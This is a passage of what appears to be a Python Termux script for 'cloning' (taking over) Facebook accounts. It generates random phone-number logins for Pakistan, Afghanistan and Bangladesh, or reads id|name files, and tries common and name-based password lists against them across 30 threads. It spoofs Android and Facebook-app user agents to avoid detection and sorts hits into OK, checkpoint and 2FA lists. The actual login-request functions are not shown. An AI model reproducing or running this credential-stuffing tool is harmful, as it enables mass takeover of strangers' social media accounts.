    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; TECNO '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
  #  awm = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
  #  m = random.choice(awm)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['7','8','9','10','11','12','13','14'])
    c='Infinix '
    d=random.choice(['X677','F98', 'NOTE 2', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 ', 'Hot 10', 'Hot 10 ', 'Note 4', 'Note 4 ', 'Hot 10s', 'Note 5', 'Note 10s ', 'Note 5', 'Note 6', 'Note 7 ', 'Note 7', 'Note 7 ', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 ', 'Hot 12 ', 'HOT','Note 12 '])
    e=random.randrange(1, 999)
    f=random.choice(['Pro 5G','Play NFC', 'Stylus', 'Play', 'NFC', 'Stylus', 'LTE', 'LITE', 'Lite', 'Zero', 'Pro', 'Play 5G', 'Pro NFC', 'i', 'VIP', '2020', '2022', 'Ultra', 'Ultra 5G', 'Smart 3G', 'Smart HD', 'Y88', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
  
  
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Qmobile '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    awm = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
    m = random.choice(awm)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l} {m}')
    ugen.append(uaku2)
    
    
    aa='Mozilla/5.0 (Linux; Android ; HLK-L42 '
    b=random.choice(['4.3','4.4.4','5.1.1','6','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; HONOR '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
  #  awm = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
   # m = random.choice(awm)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)



    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Infinix '
    d=random.choice(['X677','F98', 'NOTE 2', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 ', 'Hot 10', 'Hot 10 ', 'Note 4', 'Note 4 ', 'Hot 10s', 'Note 5', 'Note 10s ', 'Note 5', 'Note 6', 'Note 7 ', 'Note 7', 'Note 7 ', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 ', 'Hot 12 ', 'HOT','Note 12 '])
    e=random.randrange(1, 999)
    f=random.choice(['Pro 5G','Play NFC', 'Stylus', 'Play', 'NFC', 'Stylus', 'LTE', 'LITE', 'Lite', 'Zero', 'Pro', 'Play 5G', 'Pro NFC', 'i', 'VIP', '2020', '2022', 'Ultra', 'Ultra 5G', 'Smart 3G', 'Smart HD', 'Y88', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.0.0 Safari/537.36 Vivaldi/5.5.2805.50'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
	

logo = """\033[1;92m
          d8888 888      8888888888 Y88b   d88P 
         d88888 888      888         Y88b d88P  
        d88P888 888      888          Y88o88P   
       d88P 888 888      8888888       Y888P    
      d88P  888 888      888           d888b    
     d88P   888 888      888          d88888b   
    d8888888888 888      888         d88P Y88b  
   d88P     888 88888888 8888888888 d88P   Y88b                                                                                                                                  \033[1;95m
 \033[1;92m-------------------------------------------------------
 \033[1;92m[+] AUTHOR     :\033[1;92m RAFI XHOWDHURY
 \033[1;92m[+] GITHUB     : \033[1;92mGITHUB.COM/HLS706
 \033[1;92m[+] FACEBOOK   : \033[1;92mRAFI TERMUX
 \033[1;92m[+] STATUS     : \033[92;1mTESTING
 \033[1;92m[+] VIRSION    : \033[1;92mS-1
 \033[1;92m[+]-------------------------------------------------------"""
def linex():
        print('\033[1;32m-----------------------------------------')
def clear():
        os.system('clear')
        print(logo)
loop=0
lim=0
oks=[]
cps=[]
twf=[]
pcp=[]
tp=0
id=[]
tokenku=[]
r="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
b="\033[1;94m"
p="\033[1;95m"
c="\033[1;96m"
l="\033[1;97m"
A="\033[0m"
#--(light@Colours)---#
lr="\033[0;91m"
lg="\033[0;9m"
ly="\033[0;93m"
lb="\033[0;94m"
lp="\033[0;95m"
lc="\033[0;96m"
ll="\033[0;97m"

W = '\033[1;92m' 
R = '\033[1;92m' 
G = '\033[91;1m' 
Y = '\033[90;1m' 
B = '\033[94;1m'
P = '\033[96;1m'
C = '\033[95;1m'
N = '\x1b[0m'      
#____________________Menu____________________#
def menu():
        global lim,tp
        try:
                clear()
                sj="server on"
                if "server on" in sj:
                        #clear()
                        print(' [1] CRACKING FILE \n [2] CRACKING RANDOM\033[1;92m\n [3] GET FAKE-MAIL\033[1;92m\n [0] EXIT PROGRAM ')
                        print('\033[1;92m -------------------------------------------------------')
                        xd=input(' SELECT OPTION-------------------------------------> ')
                        if xd in ['1','01']:
                                file_cloning()
                        
                        elif xd in ['2','02']:
                                clear()
                               # os.system("xdg-open https://t.me/AWM_PROGRAMING")
                               # os.system("xdg-open https://www.facebook.com/700004599/posts/pfbid0jXafZLTy8DmudhBFnSASbkRSGNJ3YpcdGy4ZFG3pJq9qS26g9mQDJYpPjYxjHH7Ul/?app=fbl")
                                print(f' [1] Random Cloning {G}API{A} \033[1;97m\n [2] Random Cloning {lb}Graph{A}\033[1;97m\n [0] {r}Back menu{A}')
                                print('\033[1;97m [â—‡]-------------------------------------------------------')
                                xx=input(' [â—‡] Choose: ')
                                if xx in ['1','01']:
                                    mirwais001()
                                elif xx in ['2','02']:
                                    mirwais002()
                        elif xd in ['3','03']:
                                os.system('xdg-open https://github.com/HLS706/Temp-maill')                                                
                        elif xd in ['0','00']:
                                exit
                                runtxt('\033[1;96m [+] THANKS FOR USING')
                                
                        else:
                                runtxt('\033[1;91m [+] OPTION NOT FOUND IN MENU...');time.sleep(1)
                                menu() 
                else:
                        runtxt(' [+] Will be back soon')


                        runtxt('\033[1;92m [+]-------------------------------------------------------')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n [â—‡] No internet connection ...')
                exit()
#____________________Menu-Random____________________#

def mirwais001():
                                clear()
                                print(' [1] Pakistan Cloning\n [2] Afghanistan Cloning \n [3] Bangladesh Cloning\n [0] Back menu')
                                print('\033[1;92m-------------------------------------------------------')
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        afgan()
                                elif x in ['3','03']:
                                        bdawm()                                           
                                else:
                                        menu()
def mirwais002():
                                clear()
                                print(' [1] Pakistan Cloning\n [2] Afghanistan Cloning \n [3] Bangladesh Cloning\n [0] Back menu')
                                print('\033[1;92m-------------------------------------------------------')
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pakgraph2()
                                elif x in ['2','02']:
                                        afghangraph2()
                                elif x in ['3','03']:
                                        bdgraph2()
                                else:
                                        menu()
#____________________File-Method____________________#

def file_cloning():
                                clear()
                                print(' Put file example:  /sdcard/File.txt  etc..')
                                print(' Make sure file in your storage')
                                print('\033[1;92m -------------------------------------------------------')
                                file = input('  Put file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' [â—‡] File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' Try all methods  ')
                                print('\033[1;97m -------------------------------------------------------')
                                print(' [1] Method 1 \033[1;97m Mobile New Ids\033[1;97m \n [2] Method 2 \033[1;97m API MIX \033[1;97m\n [3] Method 3\033[1;97m  API V2 MIX\033[1;92m Update\033[1;97m ')
                                print('\033[1;97m -------------------------------------------------------')
                                mthd=input(' Choose: ')
                                print('\033[1;97m -------------------------------------------------------')
                                plist = []
                                print('choose method ');print('\033[1;97m [â—‡]-------------------------------------------------------');print(' [1] Auto Password \n [2] Choice Password \n [3] First Last Firstlast Pass Crack\n [4] Crack with First and Last name ');print('\033[1;97m [â—‡]-------------------------------------------------------')
                                ppp=input(' [â—‡] Choose: ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('first12345')
                                        plist.append('First Last')
                                        plist.append('first1234')
                                        plist.append('firstlast123')
                                        plist.append('First123')
                                        plist.append("last123")
                                        plist.append("last1234")
                                        plist.append("last12345")
                                elif ppp in ['3','03']:
                                    plist.append("firstlast")
                                    plist.append("first last")
                                    plist.append("First Last")
                                    plist.append("Firstlast")
                                    plist.append("Afghan1234")
                                elif ppp in ["4","04"]:
                                    plist.append("firstlast")
                                    plist.append("first last")
                                else:
                                        try:
                                                print('\033[1;97m [+]-------------------------------------------------------')
                                                ps_limit = int(input(' [+] How many passwords do you want to add ? '))
                                        except:
                                                ps_limit =1
                                        print('\033[1;97m [+]-------------------------------------------------------')
                                        print('\033[1;32m [+] exp: first last,firtslast,first123')
                                        print('\033[1;97m [+]-------------------------------------------------------')
                                        for i in range(ps_limit):
                                                plist.append(input(f' [â—‡] Put password {i+1}: '))
                                print('\033[1;97m [â—‡]-------------------------------------------------------')
                                print(' [+] Do You Want Show Cp Account? (Y/n): ')
                                print('\033[1;97m [+]-------------------------------------------------------')
                                cx=input(' [+] Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                    pcp.append('n')
                                
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        lim=int(total_ids)
                                        print(' [â—‡] Total ids : \033[1;32m'+total_ids)
                                        print("\033[1;32m [+] CLONING STARTED")
                                        print("\033[1;32m [+] ON/OFF YOUR MOBILE DATA BEFORE USE")                                       
                                        print('\033[1;97m [+]-------------------------------------------------------')
                            
                                        
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)

                                print('\033[1;37m')

                                print('\033[1;92m [+]-------------------------------------------------------')
                                print(' [+] The process has completed')
                                print(' [+] \033[1;32m [+] Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                                print('\033[1;92m [+]-------------------------------------------------------')
                                input(' [+] Press enter to back ')
                                os.system('python Run.py')
                                menu() 
                                
#____________________Random-Number-Gmail-Method____________________#
def pak():
                user=[]
                global lim
                clear()
                print('\033[1;31m [+] Code example: 92302,92315,92335,92345')
                code = input('\033[1;32m [+] put code: ')
                try:
                        limit = int(input('\033[1;32m [+] example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                
                with tred(max_workers=30) as AWM:     
                        clear()
                        tl = str(len(user))
                        print(f' [+]TOTAL IDS   : \033[1;32m{tl}{f} ')
                        print(f'\033[1;32m [+]CHOICE CODE :\033[1;35m {code}')
                        print(' \033[1;32m[+]USE FLIGHT MOOD BEFORE RUNNING THE  PROGRAM! ')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','peshawar','pakistan']
                                AWM.submit(rndm1,ids,passlist)
                print('\033[1;37m')
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                menu() 

def afgan():

                user=[]
                global lim
                clear()
                print('\033[1;92m [+] \033[1;32mCodes: 9370, 9377, 9378, 9379, 9374, 9372, 9376')
                code = input('\033[1;32m [+] put code: ')
                try:
                        limit = int(input('\033[1;92m [+] \033[1;31mexample: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                
                with tred(max_workers=30) as AWM:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;92m [+] \033[1;32mTotal ids : \033[1;32m'+tl)
                        print('\033[1;92m [+] \033[1;32mCLONING STARTED  ')
                        print('\033[1;92m [+] \033[1;32mON/OFF YOUR MOBILE DATA BEFORE USE ')
                        print('\033[1;92m [+]-------------------------------------------------------')               
                        for psx in user:
                                ids = code+psx
                            
                            
                                passlist = [psx,ids,psx[1:],'Afghan123','Afghanistan','afghan12345', 'afghanistan', 'afghan1234', ' kabul123', 'Û±Û²Û³Û´ÛµÛ¶','khan123']
                            
                                AWM.submit(rndm1,ids,passlist)
                print('\033[1;32m')
                print('\033[1;92m [+]-------------------------------------------------------')
                print(' [+] The process has completed')
                print(' [+]\033[1;32m [+] Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                print('\033[1;92m [+]-------------------------------------------------------')
                input(' [+]Press enter to back ')
                os.system('python Run.py')
                menu() 

def bd():
                user=[]
                global lim
                clear()
                print('\033[1;31m [+] Code example: 88017 ,88013 ,88018 ,88019 ,88016 ,88015')
                code = input('\033[1;32m [+] put code: ')
                try:
                        limit = int(input('\033[1;32m [+] example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7+8+9+11))
                        user.append(nmp)
                
                with tred(max_workers=30) as AWM:     
                        clear()
                        tl = str(len(user))
                        print(' \033[1;32m [+] Total ids : \033[1;32m'+tl)
                        print(f'\033[1;32m [+] CLONING STARTED')
                        print(f'\033[1;32m [+] ON/OFF YOUR MOBILE DATA BEFORE USE ')
                        print('\033[1;92m [+]-------------------------------------------------------')
                                               
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'free fire','Free Fire','i love you','bangladesh','I love you','786786','22334455','123456789','102030','100200']
                                AWM.submit(rndm1,ids,passlist)
                print('\033[1;32m')
                print('\033[1;92m [+]-------------------------------------------------------')
                print(' [+] The process has completed')
                print(' [+]\033[1;32m [+] Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                print('\033[1;92m [+]-------------------------------------------------------')
                input(' [+] Press enter to back ')
                os.system('python Run.py')
                menu() 
              

def afghangraph2():

                user=[]
                global lim
                clear()
                print('\033[1;97m [+] \033[1;31mCodes: 9370, 9377, 9378, 9379, 9374, 9372, 9376')
                code = input('\033[1;97m [+] \033[1;37mput code: ')
                try:
                        limit = int(input('\033[1;97m [+] \033[1;31mexample: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                
                with tred(max_workers=30) as AWM:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;92m [+]\033[1;32m Total ids : \033[1;32m'+tl)
                        print('\033[1;92m [+]\033[1;32m CLONING STARTED  ')
                        print('\033[1;92m [+]\033[1;32m ON/OFF YOUR MOBILE DATA BEFORE USE ')
                        print('\033[1;92m [+]-------------------------------------------------------')                        
                        
                        for psx in user:
                                ids = code+psx
                            
                            
                                passlist = [psx,ids,psx[1:], 'Afghan123','Afghanistan','afghan12345', 'afghanistan', 'afghan1234', ' kabul123', 'Û±Û²Û³Û´ÛµÛ¶','khan123']
                            
                                AWM.submit(rndm3,ids,passlist)
                print('\033[1;32m')
                print('\033[1;92m [+]-------------------------------------------------------')
                print(' [+] The process has completed')
                print(' [+]\033[1;32m [+] Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                print('\033[1;92m [+]-------------------------------------------------------')
                input(' [+]Press enter to back ')
                os.system('python Run.py')
                menu()                 

def bdgraph2():
                user=[]
                global lim
                clear()
                print('\033[1;31m [+] Code example: 88017 ,88013 ,88018 ,88019 ,88016 ,88015')
                code = input('\033[1;32m [+] put code: ')
                try:
                        limit = int(input('\033[1;31m [+] example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                lim=limit
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7+8+9+11))
                        user.append(nmp)
                
                with tred(max_workers=30) as AWM:     
                        clear()
                        tl = str(len(user))
                        print(' \033[1;32m [+] Total ids : \033[1;32m'+tl)
                        print(f'\033[1;32m [+] CLONING STARTED')
                        print(f'\033[1;32m [+] ON/OFF YOUR MOBILE DATA BEFORE USE ')
                        print('\033[1;97m [+]-------------------------------------------------------')
                        
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'free fire','Free Fire','i love you','bangladesh','I love you','786786','22334455','123456789','102030','100200']
                                AWM.submit(rndm3,ids,passlist)
                print('\033[1;32m')
                print('\033[1;92m [+]-------------------------------------------------------')
                print(' [+] The process has completed')
                print(' [+]\033[1;32m [+] Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                print('\033[1;97m [+]-------------------------------------------------------')
                input(' [+] Press enter to back ')
                os.system('python Run.py')
                menu() 

#____________________Ua-String-Tools____________________#
def ua_api():
    vers = random.randrange(6,13)
    fbs = random.choice([
        'com.facebook.adsmanager',
        'com.facebook.lite',
        'com.facebook.orca',
        'com.facebook.katana',
        'com.facebook.mlite'])
    verq = random.choice(["RMX3472", "RMX3611", "RMX3396", "RMX3572", "RMX3706", "RMX3396", "RMX3610", "RMX3371", "RMX3572", "RMX3461", "RMX3311", "RMX3563", "RMX3371", "RMX3269", "RMX3370", "RMX3574", "RMX3661", "RMX3611"])
    xidid = random.choice(["SP1A.210812.016","TP1A.220905.001","SP1A.210812.016","SP1A.210812.016","TP1A.220905.001","TP1A.220905.001","SP1A.210812.016","RKQ1.210503.001","TP1A.220905.001","RKQ1.211119.001","TP1A.220905.001","TP1A.220905.001","RP1A.201005.001","RP1A.201005.001","RKQ1.211119.001",])
    return ('Dalvik/2.1.0 (Linux; U; Android {vers}; {verq} Build/{xidid}) [FBAV/{str(random.randint(111,555))}.1.0.0.0;FBBV/{str(random.randint(111111111,999999999))};FBRV/0;FBPN/{fbs};FBLC/en_US;FBBD/{verq};FBSV/{str(vers)};'+'FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]')
    
useragent = str(ua_api())
samsung1 = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
